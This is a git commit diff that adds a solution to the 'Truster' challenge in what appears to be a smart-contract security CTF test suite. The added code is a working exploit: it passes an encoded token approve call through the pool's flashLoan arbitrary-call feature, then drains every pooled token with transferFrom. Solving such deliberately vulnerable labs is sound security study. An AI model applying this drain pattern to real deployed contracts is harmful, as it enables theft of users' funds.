46f095b0e0a31a59c21a6d418cb3302a441fc86e
Francisco Palacios <francisco.palacios@external.wolterskluwer.com>
2024-06-25 07:13:39 +0100

    solved truster

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -23,6 +23,15 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /*
+        * Since the flashLoan function allows callers to execute arbitrary code, we can use it to approve the pool contract to spend all of the tokens in the pool.
+        * So we call the flashLon function with the encoded approve and then we transfer the tokens from the pool to the player.
+        * */
+        const data = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
+        await pool.connect(player).flashLoan(0, player.address, token.address, data);
+
+        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+
     });
 
     after(async function () {
